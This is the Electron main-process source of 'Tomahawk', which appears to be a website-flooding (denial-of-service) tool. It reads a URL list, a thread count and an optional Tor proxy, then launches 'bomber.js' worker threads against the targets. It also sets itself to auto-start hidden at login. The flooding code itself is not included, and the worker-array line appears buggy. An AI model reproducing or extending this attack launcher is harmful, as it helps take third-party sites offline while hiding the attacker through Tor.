const { Worker } =      require('worker_threads');
// eslint-disable-next-line security/detect-child-process
const path = require('path');
const { app, BrowserWindow, ipcMain } = require('electron');
const detectPort = require('detect-port');
const AutoLaunch = require('auto-launch');
const { setState } = require('./utils/state');
const server = require('./server.js');

(async () => {
    let workers = [];

    server();

    const Tomahawk = new AutoLaunch({
        name     : 'Tomahawk',
        isHidden : true
    });

    const isEnabled = await Tomahawk.isEnabled();

    if (!isEnabled) Tomahawk.enable();

    if (require('electron-squirrel-startup')) { // eslint-disable-line global-require
        app.quit();
    }

    const createWindow = () => {
        const mainWindow = new BrowserWindow({
            width          : 800,
            height         : 600,
            icon           : `${__dirname}/icons/tomahawk.ico`,
            webPreferences : {
                nodeIntegration  : true,
                contextIsolation : false
            }
        });

        mainWindow.loadFile(path.join(__dirname, 'index.html'));

    // mainWindow.webContents.openDevTools();
    };

    const createHiddenWindow = () => {
        const mainWindow = new BrowserWindow({
            show           : false,
            webPreferences : {
                nodeIntegration  : true,
                contextIsolation : false
            }
        });

        mainWindow.loadFile(path.join(__dirname, 'index.html'));
    };

    app.on('ready', createHiddenWindow);

    function startBomber({ event, urls, tor, threads }) {
        workers = new Array(+threads).fill(new Worker(
            `${__dirname}/bomber.js`,
            { workerData: { urls, tor } }
        ).on('message', ({ url, success }) => event.reply('logs', setState({ url, success }))));
    }


    app.on('window-all-closed', () => {
        if (process.platform !== 'darwin') {
            app.quit();
        }
    });

    app.on('activate', () => {
        if (BrowserWindow.getAllWindows().length === 0) {
            createWindow();
        }
    });

    app.on('second-instance', createWindow);

    app.whenReady().then(() => {
        if (!isEnabled) createWindow();
    });

    ipcMain.on('start', async (event, data, tor, threads) => {
        const urls = data.trim().split('\n');

        if (tor) {
            detectPort(9050, (err, _port) => {
                if (err || _port === 9050) {
                    event.reply('error', 'Tor proxy is not launch');
                } else startBomber({ event, urls, tor, threads });
            });
        } else startBomber({ event, urls, tor, threads });
    });

    ipcMain.on('stop', () => {
        workers.forEach(async worker => {
            await worker.terminate();
        });
    });
})();

